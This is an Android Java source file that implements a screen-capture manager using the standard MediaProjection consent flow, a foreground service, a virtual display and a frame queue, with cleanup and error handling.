package com.security.ravan;

import android.content.Context;
import android.content.Intent;
import android.graphics.ImageFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.DisplayMetrics;
import android.util.Log;

import java.nio.ByteBuffer;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.TimeUnit;

public class ScreenCaptureManager {
    private static final String TAG = "ScreenCaptureManager";
    private static final BlockingQueue<byte[]> frameQueue = new ArrayBlockingQueue<>(10);
    private static MediaProjection mediaProjection;
    private static VirtualDisplay virtualDisplay;
    private static ImageReader imageReader;
    private static HandlerThread backgroundThread;
    private static Handler backgroundHandler;
    private static boolean active = false;
    private static Context appContext;

    public static Intent createCaptureIntent(Context context) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            return null;
        }
        try {
            MediaProjectionManager manager = (MediaProjectionManager) context.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            return manager != null ? manager.createScreenCaptureIntent() : null;
        } catch (Exception e) {
            Log.e(TAG, "Error creating capture intent", e);
            return null;
        }
    }

    public static void startProjection(Context context, int resultCode, Intent data) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            Log.e(TAG, "Screen capture requires Android 5.0+");
            return;
        }

        if (active) {
            Log.w(TAG, "Screen capture already active");
            return;
        }

        if (data == null) {
            Log.e(TAG, "Screen capture data is null");
            return;
        }

        try {
            appContext = context.getApplicationContext();
            
            MediaProjectionManager manager = (MediaProjectionManager) context.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (manager == null) {
                Log.e(TAG, "MediaProjectionManager not available");
                return;
            }

            // Start foreground service first to satisfy Android's requirement
            // that MediaProjection be started while a foreground service of type
            // ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION is running.
            startScreenCaptureService(context);

            mediaProjection = manager.getMediaProjection(resultCode, data);
            if (mediaProjection == null) {
                Log.e(TAG, "Failed to get MediaProjection");
                return;
            }

            DisplayMetrics metrics = context.getResources().getDisplayMetrics();
            int displayWidth = metrics.widthPixels;
            int displayHeight = metrics.heightPixels;
            int density = metrics.densityDpi;

            if (displayWidth <= 0 || displayHeight <= 0) {
                Log.e(TAG, "Invalid display metrics: width=" + displayWidth + ", height=" + displayHeight);
                stopProjection();
                return;
            }

            int width = Math.min(displayWidth, 1280);
            int height = Math.min(displayHeight, 720);
            if (displayWidth > displayHeight) {
                height = Math.max(1, (int) ((double) width * displayHeight / displayWidth));
            } else {
                width = Math.max(1, (int) ((double) height * displayWidth / displayHeight));
            }

            startBackgroundThread();

            imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 2);
            if (imageReader == null) {
                Log.e(TAG, "Failed to create ImageReader");
                stopProjection();
                return;
            }

            imageReader.setOnImageAvailableListener(reader -> {
                Image image = null;
                try {
                    image = reader.acquireLatestImage();
                    if (image == null) {
                        return;
                    }

                    Image.Plane[] planes = image.getPlanes();
                    if (planes == null || planes.length == 0) {
                        return;
                    }

                    ByteBuffer buffer = planes[0].getBuffer();
                    if (buffer == null) {
                        return;
                    }

                    int remaining = buffer.remaining();
                    // sanity check: avoid allocating absurdly large arrays that may crash the app
                    final int MAX_FRAME_SIZE = 5 * 1024 * 1024; // 5 MB
                    if (remaining <= 0 || remaining > MAX_FRAME_SIZE) {
                        Log.e(TAG, "Skipping frame with invalid size: " + remaining);
                        return;
                    }

                    byte[] jpegData = new byte[remaining];
                    buffer.get(jpegData);

                    // Offer to queue, evict oldest if full
                    boolean offered = frameQueue.offer(jpegData);
                    if (!offered) {
                        try {
                            frameQueue.poll();
                        } catch (Exception ex) {
                            Log.w(TAG, "Error polling frameQueue", ex);
                        }
                        try {
                            frameQueue.offer(jpegData);
                        } catch (Exception ex) {
                            Log.w(TAG, "Error offering frame to queue", ex);
                        }
                    }

                } catch (OutOfMemoryError oom) {
                    Log.e(TAG, "OutOfMemoryError while processing frame", oom);
                    // clear queue to free memory
                    try {
                        frameQueue.clear();
                    } catch (Exception ex) {
                        Log.w(TAG, "Error clearing frameQueue after OOM", ex);
                    }
                } catch (Throwable t) {
                    Log.e(TAG, "Unhandled error capturing screen frame", t);
                } finally {
                    if (image != null) {
                        try {
                            image.close();
                        } catch (Throwable t) {
                            Log.w(TAG, "Error closing image", t);
                        }
                    }
                }
            }, backgroundHandler);

            if (mediaProjection == null) {
                Log.e(TAG, "MediaProjection became null");
                stopProjection();
                return;
            }

            virtualDisplay = mediaProjection.createVirtualDisplay("ScreenCapture",
                    width,
                    height,
                    density,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.getSurface(),
                    null,
                    backgroundHandler);

            if (virtualDisplay == null) {
                Log.e(TAG, "Failed to create VirtualDisplay");
                stopProjection();
                return;
            }

            active = true;
            Log.d(TAG, "Screen capture started successfully: " + width + "x" + height + " @ " + density);
        } catch (SecurityException e) {
            Log.e(TAG, "Permission denied for screen capture", e);
            stopProjection();
        } catch (Exception e) {
            Log.e(TAG, "Error starting screen projection", e);
            stopProjection();
        }
    }

    private static void startScreenCaptureService(Context context) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                Intent serviceIntent = new Intent(context, ScreenCaptureService.class);
                context.startForegroundService(serviceIntent);
                Log.d(TAG, "Screen capture service started as foreground service");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting screen capture service", e);
        }
    }

    private static void startBackgroundThread() {
        if (backgroundThread == null) {
            try {
                backgroundThread = new HandlerThread("ScreenCaptureThread");
                backgroundThread.start();
                backgroundHandler = new Handler(backgroundThread.getLooper());
                Log.d(TAG, "Background thread started");
            } catch (Exception e) {
                Log.e(TAG, "Error starting background thread", e);
                backgroundThread = null;
                backgroundHandler = null;
            }
        }
    }

    public static void stopProjection() {
        if (!active) {
            return;
        }

        try {
            if (virtualDisplay != null) {
                try {
                    virtualDisplay.release();
                } catch (Exception e) {
                    Log.e(TAG, "Error releasing virtual display", e);
                }
                virtualDisplay = null;
            }

            if (imageReader != null) {
                try {
                    imageReader.close();
                } catch (Exception e) {
                    Log.e(TAG, "Error closing image reader", e);
                }
                imageReader = null;
            }

            if (mediaProjection != null) {
                try {
                    mediaProjection.stop();
                } catch (Exception e) {
                    Log.e(TAG, "Error stopping media projection", e);
                }
                mediaProjection = null;
            }

            if (backgroundThread != null) {
                try {
                    backgroundThread.quitSafely();
                    backgroundThread.join(2000);
                } catch (Exception e) {
                    Log.e(TAG, "Error stopping background thread", e);
                }
                backgroundThread = null;
                backgroundHandler = null;
            }

            frameQueue.clear();
            active = false;
            
            // Stop the foreground service
            if (appContext != null) {
                try {
                    Intent serviceIntent = new Intent(appContext, ScreenCaptureService.class);
                    appContext.stopService(serviceIntent);
                } catch (Exception e) {
                    Log.e(TAG, "Error stopping screen capture service", e);
                }
            }
            
            Log.d(TAG, "Screen capture stopped");
        } catch (Exception e) {
            Log.e(TAG, "Error in stopProjection", e);
            active = false;
        }
    }

    public static boolean isActive() {
        return active && mediaProjection != null;
    }

    public static byte[] getNextFrame(long timeoutMs) {
        try {
            return frameQueue.poll(timeoutMs, TimeUnit.MILLISECONDS);
        } catch (InterruptedException e) {
            return null;
        } catch (Exception e) {
            Log.e(TAG, "Error getting next frame", e);
            return null;
        }
    }

    public static byte[] getNextFrame() {
        try {
            return frameQueue.poll();
        } catch (Exception e) {
            Log.e(TAG, "Error getting next frame", e);
            return null;
        }
    }

    public static boolean hasPermission() {
        return Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP && mediaProjection != null;
    }
}
